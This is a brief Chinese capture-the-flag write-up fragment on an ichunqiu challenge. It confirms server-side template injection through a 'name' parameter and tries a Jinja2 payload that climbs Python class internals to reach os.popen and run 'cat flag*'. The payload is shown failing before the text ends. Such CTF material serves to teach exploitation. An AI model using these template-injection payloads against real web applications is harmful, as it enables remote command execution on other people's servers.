> 先fuzz测试拿到可以get一个name参数（这也要考，真是服了）
# 开始测试输入
```
http://1ae78b0533574fb6b763eccb831e0b3175b19e935cd04dd7.changame.ichunqiu.com/?name={{1%2B1}}
```
> 这样输出的是hello 2，推测是jinja2命令执行，继续深度测试
掏出上次的payload，
```
aa{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
```
en， 果然不能用,大概到func_globals['linecache']就会报错，换一个新的payload
